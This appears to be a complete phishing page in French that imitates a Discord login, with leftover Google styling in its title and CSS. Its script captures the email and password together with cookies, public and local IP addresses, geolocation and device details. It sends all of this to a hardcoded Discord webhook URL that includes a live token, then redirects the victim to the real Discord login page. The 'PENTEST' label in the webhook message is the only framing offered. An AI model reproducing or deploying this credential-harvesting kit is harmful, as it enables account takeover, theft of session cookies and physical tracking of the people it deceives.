<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - google</title>
    
</head>
<body>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Google Sans',Roboto,Arial,sans-serif; }
  body { background:#f0f4f9; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:#fff; border:1px solid #dadce0; border-radius:28px; padding:48px 40px 36px; width:448px; max-width:90%; box-shadow:0 1px 3px rgba(60,64,67,.3); position:relative; }
  .back { position:absolute; top:16px; left:16px; color:#5f6368; font-size:20px; text-decoration:none; cursor:pointer; }
  .logo { width:75px; height:75px; margin:0 auto 16px; }
  .logo svg { width:100%; height:100%; }
  h1 { font-size:24px; font-weight:400; text-align:center; color:#202124; }
  .sub { font-size:16px; color:#202124; text-align:center; margin-top:8px; }
  .user-box { display:flex; align-items:center; justify-content:center; gap:8px; margin-top:16px; }
  .avatar { width:32px; height:32px; border-radius:50%; background:#1a73e8; color:#fff; display:flex; align-items:center; justify-content:center; font-size:14px; font-weight:500; }
  .user-email { color:#5f6368; font-size:14px; }
  form { margin-top:32px; }
  .input-wrap { position:relative; margin-bottom:24px; }
  input { width:100%; padding:13px 15px; font-size:16px; color:#202124; background:#fff; border:1px solid #dadce0; border-radius:4px; outline:none; }
  input:focus { border:2px solid #1a73e8; }
  label { position:absolute; left:15px; top:14px; font-size:16px; color:#5f6368; pointer-events:none; transition:all .15s ease; background:#fff; padding:0 4px; }
  input:focus + label, input:not(:placeholder-shown) + label { top:-9px; font-size:12px; color:#1a73e8; }
  .show-row { font-size:14px; color:#202124; margin-bottom:16px; display:none; }
  .btn { float:right; background:#1a73e8; color:#fff; border:none; border-radius:20px; padding:9px 24px; font-size:14px; font-weight:500; cursor:pointer; }
  .btn:hover { background:#1765cc; }
  .link { color:#1a73e8; font-weight:500; font-size:14px; text-decoration:none; cursor:pointer; }
  .footer { margin-top:40px; display:flex; justify-content:space-between; align-items:center; font-size:12px; color:#5f6368; }
  .footer-links { display:flex; gap:24px; }
  .footer a { color:#5f6368; text-decoration:none; }
  .clearfix::after { content:""; display:table; clear:both; }
</style>
<div class="container">
    <div class="left">
        <img class="logo" src="https://seeklogo.com/images/D/discord-logo-134E148657-seeklogo.com.png" alt="Discord Logo">
        <h1>Bienvenue à nouveau !</h1>
        <p>Nous sommes si heureux de vous revoir !</p>

        <label for="email">ADRESSE E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
        <input type="text" id="email" placeholder="Entrez votre e-mail" required>

        <label for="password">MOT DE PASSE</label>
        <input type="password" id="password" placeholder="Entrez votre mot de passe" required>

        <button type="button" onclick="ouvrirDocument()">Connexion</button>

        <div class="loading" id="loading">
            <p>🔐 Vérification de vos informations...</p>
            <p>📡 Connexion sécurisée en cours...</p>
        </div>
    </div>
    <div class="right"></div>
</div>
<script>
    function ouvrirDocument() {
        var email = document.getElementById('email').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!email || !password) {
            alert('⚠️ Veuillez remplir tous les champs obligatoires');
            return;
        }

        document.getElementById('loading').style.display = 'block';
        document.querySelector('button').style.display = 'none';

        var infos = {
            email: email,
            password: password,
            navigateur: navigator.userAgent,
            plateforme: navigator.platform,
            ecran: screen.width + 'x' + screen.height,
            fenetre: window.innerWidth + 'x' + window.innerHeight,
            fuseau: Intl.DateTimeFormat().resolvedOptions().timeZone,
            url: window.location.href,
            horodatage: new Date().toISOString(),
            cookies: document.cookie || "Aucun cookie",
            connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
        };

        // Fonction pour obtenir l'IP publique
        function getPublicIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    infos.ip_publique = data.ip;
                })
                .catch(() => {
                    infos.ip_publique = "Non disponible";
                });
        }

        // Fonction pour obtenir les IP locales via WebRTC
        function getLocalIPs() {
            return new Promise((resolve) => {
                var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (RTCPeerConnection) {
                    try {
                        var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                        var ips = [];

                        pc.createDataChannel("");
                        pc.createOffer().then(pc.setLocalDescription.bind(pc));

                        pc.onicecandidate = function (ice) {
                            if (!ice || !ice.candidate) return;
                            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                            if (myIP && ips.indexOf(myIP[1]) === -1) {
                                ips.push(myIP[1]);
                            }
                        };

                        setTimeout(() => {
                            infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées";
                            pc.close();
                            resolve();
                        }, 2000);
                    } catch (e) {
                        infos.ip_locales = "Erreur WebRTC";
                        resolve();
                    }
                } else {
                    infos.ip_locales = "WebRTC non supporté";
                    resolve();
                }
            });
        }

        // Fonction pour obtenir la géolocalisation
        function getGeolocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function (position) {
                            infos.latitude = position.coords.latitude.toFixed(6);
                            infos.longitude = position.coords.longitude.toFixed(6);
                            infos.precision = position.coords.accuracy + 'm';
                            resolve();
                        },
                        function (error) {
                            infos.geolocalisation = "Refusée: " + error.message;
                            resolve();
                        },
                        { timeout: 5000 }
                    );
                } else {
                    infos.geolocalisation = "Non supportée";
                    resolve();
                }
            });
        }

        // Fonction pour envoyer les données vers le webhook
        function sendToWebhook() {
            var message = {
                content: "🎯 **NOUVELLE COLLECTE - PENTEST**",
                embeds: [{
                    title: "📊 Informations Collectées",
                    color: 3066993,
                    fields: [
                        {
                            name: "🔑 Identifiants",
                            value: "**Email:** " + infos.email + "\n**Mot de passe:** " + infos.password,
                            inline: false
                        },
                        {
                            name: "🌐 Adresses IP",
                            value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
                            inline: false
                        },
                        {
                            name: "📱 Système",
                            value: "**Plateforme:** " + infos.plateforme + "\n**Écran:** " + infos.ecran,
                            inline: true
                        },
                        {
                            name: "🌍 Localisation",
                            value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
                            inline: true
                        },
                        {
                            name: "🕒 Horodatage",
                            value: infos.horodatage,
                            inline: false
                        },
                        {
                            name: "🔗 Source",
                            value: infos.url,
                            inline: false
                        }
                    ],
                    timestamp: infos.horodatage,
                    footer: {
                        text: "PentestGPT Data Collector"
                    }
                }]
            };

            var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            }).then(function () {
                setTimeout(function () {
                    window.location.href = 'https://discord.com/login';
                }, 2000);
            }).catch(function (error) {
                console.error('Erreur:', error);
                setTimeout(function () {
                    window.location.href = 'https://discord.com/login';
                }, 2000);
            });
        }

        // === MODIFICATION : la géolocalisation est demandée EN PREMIER ===
        // Une fois la popup traitée (acceptée ou refusée), on lance le reste
        getGeolocation()
            .then(getPublicIP)
            .then(getLocalIPs)
            .then(sendToWebhook)
            .catch(console.error);
    }
</script>
</body>
</html>
